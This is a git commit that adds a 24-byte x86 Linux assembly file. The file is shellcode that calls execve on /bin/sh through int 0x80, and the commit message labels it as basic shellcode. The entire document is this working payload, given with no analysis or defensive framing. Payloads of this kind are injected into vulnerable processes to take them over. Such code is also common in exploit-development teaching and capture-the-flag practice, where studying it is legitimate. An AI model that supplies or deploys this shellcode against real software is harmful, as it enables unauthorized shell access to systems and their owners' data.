3a4af9dd6b50516a05b2e3e50628c8557c1af9c3
shareef12 <shareef12@twelvetacos.com>
2015-03-02 15:01:59 -0500

    Basic execve(/bin/sh, 0) shellcode. 24 Bytes

---
+++ execsh/exec.s
@@ -0,0 +1,17 @@
+section .text:
+    global _start
+
+_start:
+    xor     eax, eax
+    cdq
+    push    edx
+    push    0x68732f2f
+    push    0x6e69622f
+    push    esp
+    pop     ebx
+    push    edx
+    push    ebx
+    push    esp
+    pop     ecx
+    mov     al, 0xb
+    int     0x80    
